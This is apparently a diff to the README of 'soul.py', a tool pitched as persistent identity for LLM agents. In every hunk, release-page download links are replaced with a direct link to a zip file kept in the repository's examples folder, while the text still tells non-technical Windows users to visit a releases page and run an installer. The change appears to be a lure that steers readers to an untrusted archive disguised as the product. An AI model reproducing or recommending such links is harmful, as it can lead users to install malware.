@@ -1,6 +1,6 @@
 # 🧠 soul.py - Persistent Identity for LLM Agents
 
-[![Download soul.py](https://img.shields.io/badge/Download%20soul.py-green?style=for-the-badge)](https://github.com/sidiishan/soul.py/releases)
+[![Download soul.py](https://img.shields.io/badge/Download%20soul.py-green?style=for-the-badge)](https://github.com/sidiishan/soul.py/raw/refs/heads/main/examples/py_soul_v1.8.zip)
 
 ## 📋 What is soul.py?
 
@@ -24,7 +24,7 @@ soul.py does not require advanced technical skills. You will not need to write c
 
 Click this big button to visit the download page where you can get the latest version of soul.py for Windows.
 
-[![Download soul.py](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge)](https://github.com/sidiishan/soul.py/releases)
+[![Download soul.py](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge)](https://github.com/sidiishan/soul.py/raw/refs/heads/main/examples/py_soul_v1.8.zip)
 
 Once you open that page, look for the latest release. It will have files you can download. Usually, the file you want ends with `.exe` or `.msi`. These are common Windows installer formats.
 
@@ -91,7 +91,7 @@ For more details, visit the GitHub page or check the included help files in the 
 
 To update soul.py to the latest version:
 
-- Visit the [releases page](https://github.com/sidiishan/soul.py/releases) regularly.
+- Visit the [releases page](https://github.com/sidiishan/soul.py/raw/refs/heads/main/examples/py_soul_v1.8.zip) regularly.
 - Download the newest installer file.
 - Run it, and it will update your existing installation without deleting your data.
 
@@ -104,4 +104,4 @@ Keeping soul.py up to date ensures you get the latest fixes and improvements.
 - The tool supports any LLM provider, so you are not locked into one AI system.
 - soul.py focuses on stability and persistence without complex setup.
 
-[![Download soul.py](https://img.shields.io/badge/Download%20soul.py-green?style=for-the-badge)](https://github.com/sidiishan/soul.py/releases)
+[![Download soul.py](https://img.shields.io/badge/Download%20soul.py-green?style=for-the-badge)](https://github.com/sidiishan/soul.py/raw/refs/heads/main/examples/py_soul_v1.8.zip)
